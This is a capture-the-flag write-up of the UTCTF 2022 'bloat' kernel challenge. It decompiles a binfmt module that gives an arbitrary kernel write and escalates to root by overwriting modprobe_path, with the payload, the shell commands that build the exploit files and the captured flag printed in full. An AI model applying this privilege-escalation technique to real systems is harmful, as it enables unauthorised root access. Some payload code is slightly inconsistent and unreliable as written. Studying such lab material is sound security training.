```
I've created a new binary format. Unlike ELF, it has no bloat. It just consists of a virtual address to store the data at, then 248 bytes of data. However, when I tried to contribute it back to the mainline kernel they all called my submission "idiotic", and "wildly unsafe". They just cant recognize the next generation of Linux binaries.

Login with username bloat and no password

By Tristan (@trab on discord)
nc pwn.utctf.live 5003 
```

[bzImage](/utctf-2022/bins/bzImage)
[rootfs.cpio.gz](/utctf-2022/bins/rootfs.cpio.gz)
[run.sh](/utctf-2022/bins/run.sh)

fuck yeah "wildly unsafe" is my favorite phrase to hear. "A virtual address to store data and then 248 bytes of data" really screams arbitrary write to me. There isn't a lot of complexity to hide vulnerability so I suspected it would be the obvious one -- unchecked virtual address to copy the remainder of the data to. A quick look at run.sh shows that flag.txt is mounted as /dev/sda but that we'll need root to read it. 

Let's pop open the rootfs and see what can be found. 

```bash
mkdir rootfs
cd rootfs
gzip -cd ../rootfs.cpio.gz | cpio -idmv
```

Poking around, there's a pretty good amount of stuff here (a minimal linux installation) but we know more or less that we're looking for a kernel module and so we quickly find `/lib/modules/5.15.0/extra/bloat.ko`. Let's open it up!

```c

int load_bloat_binary(long param_1)

{
  ulong *puVar1;
  undefined *puVar2;
  int iVar3;
  byte *pbVar4;
  undefined *puVar5;
  undefined *puVar6;
  long lVar7;
  undefined8 uVar8;
  byte *pbVar9;
  int iVar10;
  long in_GS_OFFSET;
  bool bVar11;
  bool bVar12;
  byte bVar13;
  
  bVar13 = 0;
  pbVar4 = (byte *)strrchr(*(char **)(param_1 + 0x60),L'.');
  bVar11 = false;
  bVar12 = pbVar4 == (byte *)0x0;
  if (!bVar12) {
    lVar7 = 7;
    pbVar9 = (byte *)".bloat";
    do {
      if (lVar7 == 0) break;
      lVar7 = lVar7 + -1;
      bVar11 = *pbVar4 < *pbVar9;
      bVar12 = *pbVar4 == *pbVar9;
      pbVar4 = pbVar4 + (ulong)bVar13 * -2 + 1;
      pbVar9 = pbVar9 + (ulong)bVar13 * -2 + 1;
    } while (bVar12);
    if ((!bVar11 && !bVar12) == bVar11) {
      lVar7 = generic_file_llseek(*(undefined8 *)(param_1 + 0x40),0,2);
      generic_file_llseek(*(undefined8 *)(param_1 + 0x40),0,0);
      if (lVar7 < 0x101) {
        iVar3 = begin_new_exec(param_1);
        if (iVar3 != 0) {
          return iVar3;
        }
        puVar1 = *(ulong **)(&current_task + in_GS_OFFSET);
        *(undefined4 *)(puVar1 + 0x6f) = 0;
        set_binfmt(bloat_fmt);
        setup_new_exec(param_1);
        puVar2 = *(undefined **)(param_1 + 0xa0);
        uVar8 = 0x7ffffffff000;
        *(undefined **)(puVar1[0x62] + 0xf0) = puVar2;
        *(long *)(puVar1[0x62] + 0xf8) = *(long *)(puVar1[0x62] + 0xf0) + lVar7;
        if (((*puVar1 & 0x20000000) != 0) &&
           (uVar8 = 0xc0000000, (*(byte *)((long)puVar1 + 0x37b) & 8) == 0)) {
          uVar8 = 0xffffe000;
        }
        iVar3 = setup_arg_pages(param_1,uVar8,0);
        if (iVar3 != 0) {
          return iVar3;
        }
        vm_mmap(0,puVar2,0x100,7,0x12,0);
        __put_user_1();
        iVar10 = (int)lVar7;
        iVar3 = 0x100;
        if (iVar10 < 0x101) {
          iVar3 = iVar10;
        }
        if (8 < iVar10) {
          puVar5 = puVar2;
          do {
            puVar6 = puVar5 + 1;
            *puVar5 = puVar5[(param_1 - (long)puVar2) + 0xa8];
            puVar5 = puVar6;
          } while ((8 - (int)puVar2) + (int)puVar6 < iVar3);
        }
        finalize_exec(param_1);
        start_thread(*(long *)(*(long *)(&current_task + in_GS_OFFSET) + 0x20) + 0x3f58,puVar2,
                     *(undefined8 *)
                      (*(long *)(*(long *)(&current_task + in_GS_OFFSET) + 0x310) + 0x120));
        return 0;
      }
    }
  }
  return -8;
}
```

Ahahahahaha it's literally just that. It maps some RWX memory, copies the bytes from the rest of the file, and then executes. Unfortunately userspace code execution just won't do it so we need to do some kernel funny business to become root. All of this behavior happens as a binfmt handler which triggers for any file named ".bloat".  

I spent a good amount of time researching -- I've never actually done kernel exploitation before. I liked this challenge a lot for being rather easy but enough to sorta take the edge off my fear of kernel exploitation. After a while I found [a blog post on modprobe_path exploitation](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/) which immediately looked quite promising. 

Turns out there is a nice "modprobe_path" symbol in the kernel which points to an executable. This executable gets called whenever you try and execute a binary that has no handler. I assume there is a reason but idk why. Good thing for me since this was super easy. 

This challenge was actually even easier than the challenge that blog post went over!  We have true arbitrary write and no kaslr so all I needed to do was grab the address of modprobe_path from /proc/kallsyms and then write a brief payload to overwrite it with my own script to run as root

```python
from pwn import *

modprobe_path = p64(0xffffffff82038180)
payload = p64(modprobe_path)
payload += b"/tmp/x\x00"

print(payload)
```

```bash
echo -ne "\x80\x81\x03\x82\xff\xff\xff\xff/tmp/x\x00" > .bloat
echo -ne "#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag" > x
echo -ne "\xff\xff\xff\xff" > dummy
chmod +x ./bloat
./bloat
./dummy

cat flag
utflag{oops_forgot_to_use_put_user283558318}
```